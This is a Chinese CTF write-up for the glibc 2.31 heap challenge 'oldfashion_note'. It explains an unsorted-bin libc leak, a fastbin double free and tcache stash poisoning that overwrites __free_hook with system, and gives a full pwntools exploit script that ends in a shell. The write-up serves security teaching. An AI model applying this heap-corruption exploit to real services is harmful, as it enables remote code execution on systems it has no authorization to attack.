# oldfashion_note

## 题目简述

这是一道基于 glibc 2.31 的菜单式堆题。程序释放 note 后仍可再次释放并查看内容，但 tcache 已用 `key` 字段检测直接的 tcache double free。利用改在 fastbin 中制造重复链，再借助“从 fastbin 取块时把其余节点反向暂存进 tcache”的机制完成 tcache poisoning，最终把 `__free_hook` 改为 `system`。

## 解题过程

第一步泄露 libc。申请 8 个大小为 `0x100` 的 note，先释放其中 7 个填满该尺寸的 tcache，再释放剩余块。由于 tcache 已满，最后一个块进入 unsorted bin，其 `fd`/`bk` 中留下 `main_arena` 地址。利用释放后可查看的缺陷读取指针：

```text
libc_base = unsorted_leak - offset(__malloc_hook) - 0x70
```

第二步处理 request size `0x60` 的 fastbin：

1. 申请 11 个块，释放 0 至 6 号块，填满该尺寸的 tcache；
2. 按 `9, 10, 7, 8, 7` 的顺序释放，fastbin 链中出现由其他节点隔开的重复 7 号块，不触发“链头与当前块相同”的简单 double-free 检查；
3. 重新申请 7 次耗尽 tcache；
4. 下一次申请转向 fastbin。glibc 返回一个节点，并把 fastbin 中其余同尺寸节点 stash 到 tcache；由于重复节点的关系，随后可以改写 tcache 链的 `next` 为 `__free_hook`；
5. 连续申请直到取得位于 `__free_hook` 的伪 chunk，写入 `system`；释放保存 `/bin/sh\0` 的 note 即可触发 shell。

下面是整理后的完整利用骨架。原 PDF 的脚本只申请了索引 `0..9`，随后却调用 `delete(10)`；这是明确的下标笔误。这里修正为 `range(11)`，使 10 号块确实存在：

```python
#!/usr/bin/env python3
import hashlib
import string

from pwn import *
from pwnlib.util.iters import mbruteforce

context.arch = "amd64"

HOST = "challenge.host"
PORT = 0

io = remote(HOST, PORT)
libc = ELF("./libc-2.31.so", checksec=False)

io.recvuntil(b") == ")
digest = io.recvline().strip().decode()
proof = mbruteforce(
    lambda value: hashlib.sha256(value.encode()).hexdigest() == digest,
    string.printable,
    4,
    method="fixed",
)
io.sendlineafter(b"????> ", proof.encode())

def add(index: int, size: int, content: bytes) -> None:
    io.sendlineafter(b">> ", b"1")
    io.sendlineafter(b">> ", str(index).encode())
    io.sendlineafter(b">> ", str(size).encode())
    io.sendafter(b">> ", content)

def show(index: int) -> None:
    io.sendlineafter(b">> ", b"2")
    io.sendlineafter(b">> ", str(index).encode())

def delete(index: int) -> None:
    io.sendlineafter(b">> ", b"3")
    io.sendlineafter(b">> ", str(index).encode())

# 填满 0x110 chunk 对应的 tcache，再制造 unsorted-bin 泄露。
for index in range(8):
    add(index, 0x100, b"A" * 0x100)
for index in range(1, 8):
    delete(index)
delete(0)
show(0)

unsorted_leak = u64(io.recv(6).ljust(8, b"\x00"))
libc.address = unsorted_leak - libc.sym["__malloc_hook"] - 0x70
free_hook = libc.sym["__free_hook"]
system = libc.sym["system"]
log.success(f"libc base = {libc.address:#x}")

# 申请 11 个块，保证后续使用的索引 10 已初始化。
for index in range(11):
    add(index, 0x60, b"A" * 0x60)

# 填满 tcache，然后在 fastbin 中形成 7 -> 8 -> 7 的重复链。
for index in range(7):
    delete(index)
delete(9)
delete(10)
delete(7)
delete(8)
delete(7)

# 耗尽 tcache，使下一次 malloc 从 fastbin 取块并触发 stash。
for index in range(7):
    add(index, 0x60, b"B" * 0x60)

add(0, 0x60, p64(free_hook))
add(1, 0x60, b"\n")
add(2, 0x60, b"/bin/sh\x00\n")
add(3, 0x60, p64(system))
delete(2)

io.interactive()
```

菜单提示、泄露前缀和远程端口需要按实际附件调整；glibc 版本或 note 管理逻辑变化后，`__malloc_hook + 0x70` 的基址关系及 stash 链顺序也必须重新验证。关于同一题两种思路的对照，可参见参赛者整理的 [house of botcake 与 fastbin stash 复现](https://www.cnblogs.com/pwnfeifei/p/15856680.html)；其关键机制已在正文中说明，无需依赖外链才能理解利用。

## 方法总结

tcache 的 double-free `key` 检测只覆盖进入 tcache 的块，不等于所有重复释放都被消灭。把 tcache 填满后，释放会转入 fastbin；再清空 tcache，malloc 的 stash 行为会把 fastbin 链重新引入 tcache，从而形成跨 bin 的利用路径。分析这类题时应按每次操作画出 tcache 和 fastbin 链，而不是只记固定脚本；同时要核对所有索引是否真的已分配，避免把官方文档中的笔误当成程序特性。
